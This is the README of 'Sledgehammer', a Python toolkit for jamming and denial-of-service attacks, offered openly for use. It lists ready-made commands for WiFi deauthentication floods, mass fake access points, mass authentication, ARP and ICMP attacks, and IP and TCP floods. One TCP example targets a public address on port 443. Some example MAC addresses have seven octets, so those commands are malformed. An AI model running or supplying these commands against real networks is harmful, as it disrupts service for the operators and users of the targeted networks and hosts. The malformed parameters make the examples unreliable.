### General information
Sledgehammer is collection of Jammer/DoS tools for various protocols. Those include at minimum:

- WiFi (deauthentication, fake AP creation, etc.)
- arp
- ip
- icmp
- tcp


### Prerequisites
- Python 3.x
- Pypacker ('pip install pypacker' or clone and 'python setup.py install')

### Installation
Just download and execute.

### Usage examples
Get general help via: python sledgehammer.py --help
Depending on attack mode parameters can vary. See mode-parameters for more info.

- WiFI DoS via smart deauthentication

  python sledgehammer.py --mode wifi_deauth --iface_name wlan1 --count 9999

- WiFi DoS via mass fake APs

  python sledgehammer.py --mode wifi_ap --iface_name wlan1 --channels 1 --count 9999

- WiFi DoS via mass auth

  python sledgehammer.py --mode wifi_auth --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --channels 4 --count 9999

- ARP

  python sledgehammer.py --mode arp --iface_name wlan1 --mac_dst 00:11:22:33:44:55 --ip_dst 192.168.178.1

- ICMP

  python sledgehammer.py --mode icmp --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --ip_dst 192.168.178.1

- IP

  python sledgehammer.py --mode ip --iface_name wlan0 --mac_dst 00:11:22:33:44:55:66 --ip_dst 192.168.178.123 --count 9999

- TCP

  python sledgehammer.py --mode tcp --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --ip_dst 193.99.144.80 --port_dst 443
